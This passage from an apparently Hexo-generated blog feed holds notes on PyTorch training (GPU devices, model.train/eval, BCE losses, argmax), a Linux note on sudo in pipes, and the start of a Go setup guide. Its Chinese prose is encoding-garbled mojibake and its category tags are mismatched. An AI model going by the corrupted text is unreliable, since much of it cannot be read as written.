0ï¼Œå°†æ ‡ç­¾ç­‰äº 9 çš„æ ‡ç­¾è®¾ä¸º 1<code>train_dataset.targets[dataset.targets == 4] = 0</code><code>train_dataset.targets[dataset.targets == 9] = 1</code></p><p>æ³¨æ„å¯¹è®­ç»ƒé›†å’Œæµ‹è¯•é›†éƒ½è¦æ”¹å˜ <ahref="https://discuss.pytorch.org/t/change-labels-in-data-loader/36823">Changelabels in Data Loader - vision - PyTorch Forums</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pytorch å›å½’åˆ†ç±»å¸¸ç”¨å‡½æ•°</title>
      <link href="/blog/2023/02/15/programming/python/pytorch/torch_train_skills/"/>
      <url>/blog/2023/02/15/programming/python/pytorch/torch_train_skills/</url>
      
        <content type="html"><![CDATA[<h2 id="torch-è®­ç»ƒç›¸å…³">torch è®­ç»ƒç›¸å…³</h2><h3 id="pytorch-ä½¿ç”¨-gpu">Pytorch ä½¿ç”¨ GPU</h3><ol type="1"><li><p>è®¾å¤‡è½¬æ¢</p><p>2 things must be on GPU: model, tensors, å¤„äºåŒè®¾å¤‡ï¼ˆCPU æˆ–GPUï¼‰çš„æ•°æ®æ‰èƒ½å¤Ÿäº’ç›¸è¿ç®—ï¼Œå¦åˆ™éœ€è¦è½¬æ¢åˆ°åŒä¸€è®¾å¤‡</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># For nvidia GPU</span><br><span class="line">cuda_device = torch.device(&quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;)</span><br><span class="line"></span><br><span class="line"># For arm-based Apple M1&#x27;s GPU</span><br><span class="line">device = torch.device(&quot;mps&quot; if torch.backends.mps.is_available() else &quot;cpu&quot;)</span><br><span class="line"></span><br><span class="line">cpu_device = torch.device(&quot;cpu&quot;)</span><br><span class="line"></span><br><span class="line"># use case</span><br><span class="line">model = model.to(cuda_device)</span><br><span class="line">tensor = tensor.to(device)</span><br><span class="line">model = model.to(cpu_device)</span><br></pre></td></tr></table></figure></p><p><ahref="https://www.deeplearningwizard.com/deep_learning/practical_pytorch/pytorch_logistic_regression/#building-a-logistic-regression-model-with-pytorch-gpu">LogisticRegression - Deep Learning Wizard</a></p></li><li><p><code>torch.cuda()</code> å’Œ<code>tensor.to(torch.device("cuda"))</code> åŒºåˆ«</p><blockquote><p>Early versions of pytorch had <code>.cuda()</code> and<code>.cpu()</code> methods to move tensors and models from cpu to gpuand back. However, this made code writing a bit cumbersome. Laterversions introduced <code>.to()</code> that basically takes care ofeverything in an elegant way:</p></blockquote><p><ahref="https://stackoverflow.com/questions/62907815/pytorch-what-is-the-difference-between-tensor-cuda-and-tensor-totorch-device">python- PyTorch: What is the difference between tensor.cuda() andtensor.to(torch.device("cuda:0"))? - Stack Overflow</a></p><p>æ¨èä½¿ç”¨æ–°ç‰ˆçš„ <code>tensor.to(torch.device("cuda"))</code></p></li></ol><p>æ³¨æ„ï¼š<code>tensor.to()</code> æ‰§è¡Œçš„ä¸æ˜¯ inplaceæ“ä½œï¼Œå› æ­¤éœ€è¦èµ‹å€¼ï¼›<code>module.to()</code> æ‰§è¡Œçš„æ˜¯ inplace æ“ä½œã€‚</p><h2 id="tensor-åœ¨-cpu-ä¸-gpu-ä¹‹é—´">tensor åœ¨ cpu ä¸ gpu ä¹‹é—´</h2><ol type="1"><li><p>æƒ³è¦ä¿®æ”¹æ¨¡å‹å‚æ•°ï¼Œç„¶åç»§ç»­ä½¿ç”¨ï¼š</p><ol type="1"><li>å°†å…¶ä» gpu æ‹·è´ä¸€ä»½ï¼Œä½¿ç”¨ï¼š <code>.cpu().detach()</code> è¿”å› tensorå½¢å¼ æˆ– <code>.cpu().detach().numpy()</code> è¿”å› numpy å½¢å¼</li><li>ç„¶åï¼Œå¯¹ tensor æˆ–è€… numpy è¿›è¡Œä¿®æ”¹ æœ€åï¼Œå°† CPU ä¸­ä¿®æ”¹çš„tensorï¼ˆnumpy éœ€è¦è½¬æ¢ä¸º tensorï¼‰æ‹·è´åˆ° gpu ä¸­å»ï¼š.cuda() æˆ–.to(device=torch.device('gpu'))</li></ol><p>å³ä½¿ copy.deepcopy äº† tensorï¼Œ tensor ä¹Ÿæ˜¯åœ¨ gpu ä¸­çš„ï¼Œéœ€è¦è½¬åˆ°cpu</p><p><ahref="https://%20androidkt.com/copy-pytorch-model-using-deepcopy-and-state_dict/">CopyPyTorch Model using deepcopy() and state_dict() - Knowledge Transfer</a><a href="https://zhuanlan.zhihu.com/p/91485607">Pytorch çš„ 12 ä¸ªå‘ -çŸ¥ä¹</a></p></li></ol><h3 id="model.train-å’Œ-model.eval">model.train() å’Œ model.eval()</h3><p><code>model.train()</code>: åœ¨ä½¿ç”¨ pytorchæ„å»ºç¥ç»ç½‘ç»œçš„æ—¶å€™ï¼Œè®­ç»ƒè¿‡ç¨‹ä¸­ä¼šåœ¨ç¨‹åºä¸Šæ–¹æ·»åŠ ä¸€å¥model.train()ï¼Œä½œç”¨æ˜¯å¯ç”¨ batch normalization å’Œ drop outã€‚</p><p><code>model.eval()</code>: æµ‹è¯•è¿‡ç¨‹ä¸­ä¼šä½¿ç”¨model.eval()ï¼Œè¿™æ—¶ç¥ç»ç½‘ç»œä¼šæ²¿ç”¨ batch normalization çš„å€¼ï¼Œå¹¶ä¸ä½¿ç”¨ dropoutã€‚</p><p>å¦‚æœæ¨¡å‹ä¸­æœ‰ BN å±‚ (Batch Normalization)å’Œ Dropoutï¼Œéœ€è¦åœ¨è®­ç»ƒæ—¶æ·»åŠ <code>model.train()</code>ï¼Œåœ¨æµ‹è¯•æ—¶æ·»åŠ  <code>model.eval()</code>ã€‚å…¶ä¸­model.train()æ˜¯ä¿è¯ BN å±‚ç”¨æ¯ä¸€æ‰¹æ•°æ®çš„å‡å€¼å’Œæ–¹å·®ï¼Œè€Œ<code>model.eval()</code> æ˜¯ä¿è¯ BN ç”¨å…¨éƒ¨è®­ç»ƒæ•°æ®çš„å‡å€¼å’Œæ–¹å·®ï¼›è€Œå¯¹äºDropoutï¼Œmodel.train()æ˜¯éšæœºå–ä¸€éƒ¨åˆ†ç½‘ç»œè¿æ¥æ¥è®­ç»ƒæ›´æ–°å‚æ•°ï¼Œè€Œ<code>model.eval()</code> æ˜¯åˆ©ç”¨åˆ°äº†æ‰€æœ‰ç½‘ç»œè¿æ¥ã€‚</p><p>å¦‚æœæ²¡æœ‰ BN å±‚ (Batch Normalization)å’Œ Dropoutè¿™ä¸¤ç§å±‚ï¼Œå°±ä¸ç”¨å†™äº†ã€‚</p><p><a href="https://stackoverflow.com/a/66526891">python - What doesmodel.train() do in PyTorch? - Stack Overflow</a> <ahref="https://zhuanlan.zhihu.com/p/254738836">[PyTorch å­¦ä¹ ç¬”è®°] 7.3ä½¿ç”¨ GPU è®­ç»ƒæ¨¡å‹ - çŸ¥ä¹</a></p><h2 id="å°çŸ¥è¯†">å°çŸ¥è¯†</h2><ol type="1"><li><p><code>Loss.item()</code></p><p>The <code>.item()</code> method extracts the lossâ€™s value as a Pythonfloat, so that you can do some operations, such as sum and averageoperations.</p><p><code>.item()</code> moves the data to CPU. It converts or extractsthe lossâ€™s value as a Python float. and the plain python float numbercan only live on the CPU.</p><p><a href="https://discuss.pytorch.org/t/what-is-loss-item/61218">Whatis loss.item() - autograd - PyTorch Forums</a></p></li><li><p>In Pytorch, when dataset = cifar, the type(dataset.targets) islist</p><p>æ³¨æ„ pytorch è¯»å– MNIST è¯»å‡ºæ¥çš„ <code>dataset.targets</code> æ˜¯Tensorï¼Œä½†æ˜¯è¯»å– CIFAR10 è¯»å–å‡ºæ¥çš„ä¸æ˜¯ Tensorï¼Œè€Œæ˜¯ list.ç»Ÿä¸€è®­ç»ƒçš„æ—¶å€™ï¼Œæ³¨æ„åˆ¤æ–­</p></li><li><p>Time</p><p>CPU è·‘ MNIST å¤šåˆ†ç±»é€»è¾‘å›å½’ï¼š 6 min å·¦å³ GPU è·‘ MNISTå¤šåˆ†ç±»é€»è¾‘å›å½’ï¼š 1min30 min å·¦å³</p></li><li><p>accuracy</p><ol type="1"><li>a binary classification model using logistic regression on MNIST canconverges to 98% accuracy</li><li>a multi-class classification model using logistic regression onMNIST can converges to 92% accuracy</li></ol><p>å‚è€ƒï¼š <ahref="https://stackoverflow.com/questions/45954289/logistic-regression-implementation-with-mnist-not-converging">python- Logistic Regression implementation with MNIST - not converging? -Stack Overflow</a></p></li></ol><h2 id="å¤åˆ¶åˆ›å»ºç‹¬ç«‹æ–°æ¨¡å‹">å¤åˆ¶åˆ›å»ºç‹¬ç«‹æ–°æ¨¡å‹</h2><pre><code>The PyTorch model æ˜¯å¯å˜å¯¹è±¡ï¼Œå› æ­¤ç›´æ¥èµ‹å€¼æ˜¯æµ…æ‹·è´ï¼Œéœ€è¦ä½¿ç”¨ `copy.deepcopy()` æˆ–è€… `model.state_dict()` æ¥è¿›è¡Œæ·±æ‹·è´ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import copy</span><br><span class="line">modelB = copy.deepcopy(modelA)</span><br></pre></td></tr></table></figure>[Copy PyTorch Model using deepcopy() and state_dict() - Knowledge Transfer](https://androidkt.com/copy-pytorch-model-using-deepcopy-and-state_dict/)</code></pre><h2 id="numpy-å’Œ-torch-çš„-çŸ©é˜µä¹˜">numpy å’Œ torch çš„ çŸ©é˜µä¹˜</h2><p>ä¸¤ä¸ªçŸ©é˜µç›¸ä¹˜ï¼š <code>np.dot(A,B)</code> æˆ–è€…<code>np.matmul(A, B)</code> å¤šä¸ªçŸ©é˜µç›¸ä¹˜ï¼š æ¯ä¸¤ä¸ªä½¿ç”¨ <code>dot</code>æˆ–è€… <code>matmul</code> æˆ–ç›´æ¥ä½¿ç”¨ <code>@</code> ç¬¦å· å¯¹åº”å…ƒç´ ç›¸ä¹˜ï¼š<code>np.multiply</code> æˆ–è€… <code>*</code></p><p><code>torch.mul()</code>æ˜¯å¯¹åº”å…ƒç´ ç›¸ä¹˜ï¼ˆå¯å¹¿æ’­ï¼‰ï¼Œ<code>torch.mm()</code> æ˜¯çŸ©é˜µç›¸ä¹˜ <ahref="https://blog.51cto.com/u_15127604/3856291">torch.mul() å’Œtorch.mm() åŒºåˆ«_mob604756f6df2a çš„æŠ€æœ¯åšå®¢_51CTO åšå®¢</a></p><h2 id="jupyter-notebook-ç¼“å­˜é—®é¢˜">jupyter notebook ç¼“å­˜é—®é¢˜</h2><ol type="1"><li><p>åœ¨å¤–éƒ¨æ›´æ”¹äº†è°ƒç”¨çš„å‡½æ•°çš„ä»£ç ï¼Œä½†æ˜¯å®ƒä¾ç„¶ä½¿ç”¨æ—§çš„ç¼“å­˜çš„ä»£ç ï¼Œè§£å†³æ–¹æ³•ï¼š</p><p>Put in the following two cells at the beggining of your code and itwill automatically reload any new version of your code:</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%load_ext autoreload</span><br><span class="line">%autoreload <span class="number">2</span></span><br></pre></td></tr></table></figure></p><p><ahref="https://stackoverflow.com/questions/29353600/ipython-notebook-caching-issue">python- Ipython notebook caching issue - Stack Overflow</a></p></li></ol><h2 id="äº¤å‰ç†µ">äº¤å‰ç†µ</h2><p>äº¤å‰ç†µé¢„æµ‹ç»“æœçš„æ¦‚ç‡çŸ©é˜µï¼Œæ±‚é¢„æµ‹æ¦‚ç‡æœ€å¤§çš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨çš„å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">torch.<span class="built_in">max</span>(<span class="built_in">input</span>, dim, keepdim=<span class="literal">False</span>) è¿”å› (<span class="built_in">max</span>, max_indices)</span><br><span class="line">torch.argmax(<span class="built_in">input</span>, dim, keepdim=<span class="literal">False</span>) è¿”å› max_indices</span><br></pre></td></tr></table></figure><p>å¸¸è§å½¢å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outputs = model(images)</span><br><span class="line">_, predicted = torch.<span class="built_in">max</span>(outputs.data, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outputs = model(images)</span><br><span class="line">predicted = outputs.argmax(dim=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="nn.parameter-åˆå§‹åŒ–åœ¨-gpu-è®¾å¤‡ä¸Š">nn.Parameter åˆå§‹åŒ–åœ¨ GPUè®¾å¤‡ä¸Š</h2><p><ahref="https://github.com/pytorch/pytorch/issues/20089">[Undesirablebehaviour] Allocating a nn.Parameter on gpu inside a nn.Module makes itnot to be enlisted as network parameter Â· Issue #20089 Â·pytorch/pytorch</a></p><h2 id="softmax-å’Œ-sigmoid">softmax å’Œ sigmoid</h2><table><colgroup><col style="width: 7%" /><col style="width: 49%" /><col style="width: 43%" /></colgroup><thead><tr class="header"><th style="text-align: center;">æ¿€æ´»å‡½æ•°</th><th style="text-align: center;">sigmoid</th><th style="text-align: center;">softmax</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">åˆ†ç±»</td><tdstyle="text-align: center;">ä¸€èˆ¬ç”¨äºäºŒå€¼åˆ†ç±»ï¼Œå¯ä»¥ä½†ä¸å»ºè®®ç”¨äºå¤šå€¼åˆ†ç±»ï¼Œå‡†ç¡®ç‡ä½</td><td style="text-align: center;">å¯ä»¥ç”¨äºäºŒå€¼ä»¥åŠå¤šå€¼åˆ†ç±»</td></tr><tr class="even"><td style="text-align: center;">ä½¿ç”¨æ³¨æ„</td><td style="text-align: center;">åˆ†ç±»ä¸æ˜ç¡®çš„ï¼Œæ¦‚ç‡æ€§çš„ï¼Œä½¿ç”¨sigmoid</td><td style="text-align: center;">åˆ†ç±»äº’æ–¥ï¼Œå¯ä»¥æ˜ç¡®è¾“å‡ºæ˜¯å“ªä¸ªç±»åˆ«çš„ä½¿ç”¨softmax</td></tr><tr class="odd"><td style="text-align: center;">äº¤å‰ç†µ</td><td style="text-align: center;">BCE: binary cross-entropy</td><td style="text-align: center;">categorical cross-entropy</td></tr></tbody></table><p><ahref="https://stackoverflow.com/questions/49990816/sigmoid-activation-for-multi-class-classification">machinelearning - Sigmoid activation for multi-class classification? - StackOverflow</a></p><p><ahref="https://datascience.stackexchange.com/questions/39264/how-does-sigmoid-activation-work-in-multi-class-classification-problems">machinelearning - How does Sigmoid activation work in multi-classclassification problems - Data Science Stack Exchange</a></p><h2 id="binary-crossentropy-related">binary crossentropy related</h2><p><code>torch.nn.BCELoss(weight=None, size_average=None, reduce=None, reduction='mean')</code>:weight æ˜¯ sigmoid é¢„æµ‹çš„ç±»åˆ«æ¦‚ç‡ï¼ŒIf given, has to be<code>a Tensor of size nbatch</code>: [batch_size,number_class]ï¼Œï¼ˆéœ€è¦æ¢¯åº¦ï¼Œfloat ç±»åˆ«ï¼‰ <code>'reduction='mean'</code>:the sum of the output will be divided by the number of elements in theoutput.</p><p><code>nn.BCEWithLogitsLoss()</code> å°è£…äº† sigmoidæ‰€ä»¥ç›´æ¥æŠŠæ¨¡å‹çš„è¾“å…¥ä¼ è¿›å»å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span> = torch.randn(<span class="number">3</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line">target = torch.empty(<span class="number">3</span>).random_(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sigmoid = nn.Sigmoid()</span><br><span class="line">bce_loss = nn.BCELoss()</span><br><span class="line">bce_logits_loss = nn.BCEWithLogitsLoss()</span><br><span class="line"></span><br><span class="line"><span class="comment">#with class probabilities</span></span><br><span class="line">probabilities=sigmoid(<span class="built_in">input</span>)</span><br><span class="line">output = bce_loss(probabilities, target)</span><br><span class="line">output.backward()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output.item()) <span class="comment">#0.4326</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#with logits</span></span><br><span class="line">output = bce_logits_loss(<span class="built_in">input</span>, target)</span><br><span class="line">output.backward()</span><br></pre></td></tr></table></figure><p><ahref="https://zhang-yang.medium.com/how-is-pytorchs-binary-cross-entropy-with-logits-function-related-to-sigmoid-and-d3bd8fb080e7">Howis Pytorchâ€™s binary_cross_entropy_with_logits function related tosigmoid and binary_cross_entropy | by Yang Zhang | Medium</a></p><p><ahref="https://androidkt.com/difference-between-bceloss-and-bcewithlogitsloss-in-pytorch/">Differencebetween BCELoss and BCEWithLogitsLoss in PyTorch - KnowledgeTransfer</a></p><h2 id="soft-targets-vs-hard-target">soft targets vs hard target</h2><p>soft targets å°±æ˜¯ softmax å¾—å‡ºçš„å„ç±»çš„æ¦‚ç‡ ä¸€èˆ¬ä½¿ç”¨ soft target çš„loss function</p><p>hard target åŒ…å«çš„ä¿¡æ¯é‡ï¼ˆä¿¡æ¯ç†µï¼‰å¾ˆä½ï¼Œ soft targetåŒ…å«çš„ä¿¡æ¯é‡å¤§ï¼Œæ‹¥æœ‰ä¸åŒç±»ä¹‹é—´å…³ç³»çš„ä¿¡æ¯ï¼ˆæ¯”å¦‚åŒæ—¶åˆ†ç±»é©´å’Œé©¬çš„æ—¶å€™ï¼Œå°½ç®¡æŸå¼ å›¾ç‰‡æ˜¯é©¬ï¼Œä½†æ˜¯soft target å°±ä¸ä¼šåƒ hard target é‚£æ ·åªæœ‰é©¬çš„ index å¤„çš„å€¼ä¸º 1ï¼Œå…¶ä½™ä¸º0ï¼Œè€Œæ˜¯åœ¨é©´çš„éƒ¨åˆ†ä¹Ÿä¼šæœ‰æ¦‚ç‡ã€‚ï¼‰</p><h2 id="mnist-softmax-logistic-regression-å‚æ•°">MNIST softmax logisticregression å‚æ•°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Model: &quot;sequential&quot;</span><br><span class="line">mathjax: true</span><br><span class="line">---Layer (type) Output Shape Param #</span><br><span class="line">mathjax: true</span><br><span class="line">---flatten (Flatten) (None, 784) 0</span><br><span class="line">mathjax: true</span><br><span class="line">---dense (Dense) (None, 10) 7850</span><br><span class="line">---</span><br><span class="line">Total params: 7,850</span><br><span class="line">Trainable params: 7,850</span><br><span class="line">Non-trainable params: 0</span><br><span class="line">mathjax: true</span><br><span class="line">---```</span><br><span class="line"></span><br><span class="line">parameters: `784*10 weights + 10 biases at output nodes = 7850`</span><br><span class="line"></span><br><span class="line">æ¯å¼ å›¾åƒçš„è¾“å‡ºéƒ½æ˜¯ä¸€ä¸ªå¤§å°ä¸º 10 çš„å‘é‡ï¼Œè¯¥å‘é‡çš„æ¯ä¸ªå…ƒç´ éƒ½æŒ‡ç¤ºäº†è¯¥å›¾åƒå±äºæŸä¸ªå…·ä½“æ ‡ç­¾ï¼ˆ0 åˆ° 9ï¼‰çš„æ¦‚ç‡ã€‚ä¸ºå›¾åƒé¢„æµ‹å¾—åˆ°çš„æ ‡ç­¾å³ä¸ºæ¦‚ç‡æœ€é«˜çš„æ ‡ç­¾ã€‚</span><br><span class="line"></span><br><span class="line">[Feed-forward and convolutional neural networks](https://uudav.nl/practicals/04_deep_learning/practical_04_answers.html)</span><br><span class="line"></span><br><span class="line">## å¤šåˆ†ç±»/äºŒåˆ†ç±»</span><br><span class="line"></span><br><span class="line">å¯¹ crossentropy è¾“å‡ºçš„æ¦‚ç‡ï¼Œæ±‚æœ€å¤§çš„å€¼åŠå…¶ç´¢å¼•: `_, preds = torch.max(outputs, 1)`</span><br><span class="line"></span><br><span class="line">At this point, we need to determine the index corresponding to the maximum score in the out tensor. We can do that using the max function in PyTorch, which outputs the maximum value in a tensor as well as the indices where that maximum value occurred.</span><br><span class="line"></span><br><span class="line">## [conv neural network - ValueError: Target size (torch.Size([16])) must be the same as input size (torch.Size([16, 1])) - Stack Overflow](https://stackoverflow.com/questions/57798033/valueerror-target-size-torch-size16-must-be-the-same-as-input-size-torch)</span><br><span class="line"></span><br><span class="line">pytorch äºŒåˆ†ç±» using BCEWithLogitsLossï¼Œ output neuron = 1, `preds.squeeze(dim=-1).float()`</span><br><span class="line"></span><br><span class="line">### äºŒåˆ†ç±»æµ‹è¯•</span><br><span class="line"></span><br><span class="line">sigmoid äºŒåˆ†ç±»ï¼Œæµ‹è¯•å‡†ç¡®åº¦æ—¶ï¼Œæ³¨æ„é¢„æµ‹æ¦‚ç‡æ˜¯ [0,1]ï¼Œæ‰€ä»¥å°†å…¶ä¸ 0.5 è¿›è¡Œæ¯”è¾ƒ</span><br><span class="line">`predicted = (model(image) &gt; 0.5).float().squeeze(dim=-1)`</span><br><span class="line"></span><br><span class="line">softmax äºŒåˆ†ç±»ï¼Œæµ‹è¯•å‡†ç¡®åº¦æ—¶ï¼Œæ³¨æ„é¢„æµ‹æ¦‚ç‡æ˜¯ [-inf,inf]ï¼Œæ‰€ä»¥éœ€è¦å°†å…¶ä¸ 0 æ¯”è¾ƒ</span><br><span class="line">`predicted = (model(image) &gt; 0).float().squeeze(dim=-1)`</span><br><span class="line"></span><br><span class="line">[Accuracy not changing after second training epoch - PyTorch Forums](https://discuss.pytorch.org/t/accuracy-not-changing-after-second-training-epoch/80405/3)</span><br><span class="line"></span><br><span class="line"># accuracy å…ˆç¨³å®šä¸Šå‡ï¼Œç„¶åä¸€ç›´é™ä½</span><br><span class="line"></span><br><span class="line">å­¦ä¹ ç‡è¿‡å¤§/batch size è¿‡å°ï¼Œå¯ä»¥å¯¹å­¦ä¹ ç‡é™ä½ 1-2 ä¸ªé‡çº§è¯•è¯•</span><br><span class="line">[è®­ç»ƒç½‘ç»œæ—¶ä¸ºä»€ä¹ˆä¼šå‡ºç° loss é€æ¸å¢å¤§çš„æƒ…å†µï¼Ÿ - çŸ¥ä¹](https://www.zhihu.com/question/60510992)02</span><br><span class="line"></span><br><span class="line">## å‡†ç¡®ç‡å…ˆå‡åé™ï¼Œå†å‡</span><br><span class="line"></span><br><span class="line">é‡‡ç”¨ warm up + Cosine Annealï¼š</span><br><span class="line"></span><br><span class="line">[è®­ç»ƒç¥ç»ç½‘ç»œ Loss å…ˆé™åå‡ï¼Ÿ - ç®€ä¹¦](https://www.jianshu.com/p/c8583867677e)</span><br><span class="line">[base model ç¬¬ä¸ƒå¼¹ï¼šwarm upã€consine è¡°å‡ ã€æ ‡ç­¾å¹³æ»‘ã€apexã€æ¢¯åº¦ç´¯åŠ  - çŸ¥ä¹](https://zhuanlan.zhihu.com/p/148487894)</span><br><span class="line"></span><br><span class="line">[ä½¿ç”¨ä½™å¼¦é€€ç«é€ƒç¦»å±€éƒ¨æœ€ä¼˜ç‚¹â€”â€”å¿«ç…§é›†æˆ(Snapshot Ensembles)åœ¨ Keras ä¸Šçš„åº”ç”¨ - çŸ¥ä¹](https://zhuanlan.zhihu.com/p/93648558)</span><br><span class="line"></span><br><span class="line">[Pytorchï¼šå‡ è¡Œä»£ç è½»æ¾å®ç° Warm up + Cosine Anneal LR\_æˆ‘æ˜¯å¤§é»„åŒå­¦å‘€çš„åšå®¢-CSDN åšå®¢\_pytorch warmup å®ç°](https://blog.csdn.net/qq_36560894/article/details/114004799)</span><br><span class="line"></span><br><span class="line">[è°ƒèŠ‚å­¦ä¹ ç‡ - çŸ¥ä¹](https://zhuanlan.zhihu.com/p/136183319)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux å¸¸è§é—®é¢˜</title>
      <link href="/blog/2023/01/04/linux/linux_issues/"/>
      <url>/blog/2023/01/04/linux/linux_issues/</url>
      
        <content type="html"><![CDATA[<ol type="1"><li>sudo åœ¨ç®¡é“ä¸­å¹¶ä¸ä¼ é€’æƒé™ï¼Œéœ€è¦æ¯ä¸ªå‘½ä»¤éƒ½ç”¨ sudo</li></ol><p>åœ¨æ“ä½œæ•æ„Ÿç›®å½•æ—¶å€™ï¼Œä½¿ç”¨ç®¡é“å‘½ä»¤ï¼Œæ³¨æ„å¦‚æœåé¢çš„å‘½ä»¤ä¹Ÿéœ€è¦æƒé™ï¼Œé‚£å°±ä¹Ÿéœ€è¦å†™sudo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -L https://github.com/jgm/pandoc/releases/download/3.1.6/pandoc-3.1.6-linux-amd64.tar.gz | sudo tar -xvzf -C $&#123;RUNNER_TOOL_CACHE&#125;/</span><br></pre></td></tr></table></figure><p>é”™è¯¯å°è¯•ï¼š(æ²¡æœ‰åœ¨ç®¡é“ä¹‹ååŠ  sudoï¼Œå¯¼è‡´åˆ›å»ºå¤±è´¥)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">ls</span> ./ || <span class="built_in">mkdir</span> -p /opt/hostedtoolcache</span></span><br><span class="line">.DS_Store.github</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll /opt/hostedtoolcache</span></span><br><span class="line">ls: /opt/hostedtoolcache: No such file or directory</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Go é¡¹ç›®é…ç½®ä¸è¿è¡Œ</title>
      <link href="/blog/2022/12/16/programming/go/go_run_project/"/>
      <url>/blog/2022/12/16/programming/go/go_run_project/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹å¦‚ä½•è¿è¡Œä¸€ä¸ªæ¥è‡ª GitHub ç­‰æ¸ é“çš„ç°æˆçš„ Go é¡¹ç›®.</p><p>æƒ…å†µåˆ†ä¸¤ç§:</p><ol type="1"><li>æœ‰ go.mod é€šè¿‡ module æ–¹å¼å¼€å‘çš„,</li><li>æ—  go.mod, é€šè¿‡ GOPATH æ—§ç‰ˆæœ¬æ–¹å¼å¼€å‘çš„</li></ol><h2 id="module-æ–¹å¼å¼€å‘">module æ–¹å¼å¼€å‘</h2><blockquote><p>Go 1.11 and 1.12 include preliminary support for modules, Go 1.16Modules on by default.</p></blockquote><p>å¯¹äºæœ‰ go.mod çš„é¡¹ç›®:</p><ol type="1"><li><p><code>git clone xx</code> å…‹éš†é¡¹ç›®åˆ°æœ¬åœ°</p></li><li><p><code>go get</code> æ ¹æ® go.mod ä¸‹è½½å¯¹åº”çš„åŒ…</p></li><li><p>æ˜¯å¦æœ‰ main å‡½æ•°</p><ol type="1"><li><p>å¦‚æœæœ‰</p><p><code>go run *.go</code> ç›´æ¥è¿è¡Œ,ä¸ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶<code>go build *.go</code> ç¼–è¯‘ä¸ºå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶,ç„¶å<code>./main</code> è¿è¡Œ</p></li><li><p>å¦‚æœæ²¡æœ‰</p><p>ä¸€èˆ¬åº“æ²¡æœ‰ main å‡½æ•°,æ¯ä¸ªæ–‡ä»¶ä¼šæœ‰å¯¹åº”çš„ test å‡½æ•°, å¯ä»¥ä½¿ç”¨ vscode çš„test 